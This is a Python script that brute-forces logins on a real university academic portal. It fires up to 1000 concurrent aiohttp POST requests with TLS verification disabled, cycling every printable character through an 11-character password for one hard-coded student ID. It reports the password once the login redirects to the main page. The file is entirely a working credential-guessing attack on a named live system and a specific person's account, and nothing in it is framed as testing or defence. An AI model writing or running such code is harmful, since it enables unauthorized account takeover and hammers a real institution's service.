import json
import asyncio
import ssl
import requests
import aiohttp
import sys
import threading

async def requestlogin(sem,id, password):
    url = "https://akad.unimed.ac.id/index.php"
    header = {
    "Host" : "akad.unimed.ac.id",
    "User-Agent" : "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Mobile Safari/537.36"
    }
    payload = {
        "usid" : "4203250014",
        "pwd" : "akuhebat123",
        "role" : "s",
        "action" : "login",
    }
    payload["pwd"] = password
    payload["usid"] = id
    async with aiohttp.TCPConnector(ssl=False) as conn:
            async with aiohttp.ClientSession(connector=conn)as session:
                async with sem, session.post(url=url, data=payload, headers=header, ssl=False) as request:
                    print(password)
                    if request.status == 200:
                        if(str(request.url) == "https://akad.unimed.ac.id/main.php"):
                            print(f"password benar {password}")
                            sys.exit()

async def getLettersList(start):
    elements = [*range(ord(start), 126)]
    elements.extend(range(32, ord(start)))
    return [chr(i) for i in elements]


async def IteratePosition(index):
    try:
        global text, PASSWORDLENGHT,tasks
        sem = asyncio.Semaphore(1000)
        if index == PASSWORDLENGHT - 1:
            for character in await getLettersList(text[index]):
                text[index] = character
                pw = "".join(text)
                print(pw)
                task = asyncio.ensure_future(requestlogin(sem,4203250014,pw))
                tasks.append(task)
        else:
            for character in await getLettersList(text[index]):
                text[index] = character
                await asyncio.gather(*tasks)
                await IteratePosition(index + 1)
    except:
        pass


PASSWORDLENGHT = 11
tasks = []
text = list("akuhebat103")
try:
    asyncio.run(IteratePosition(0))
except:
    pass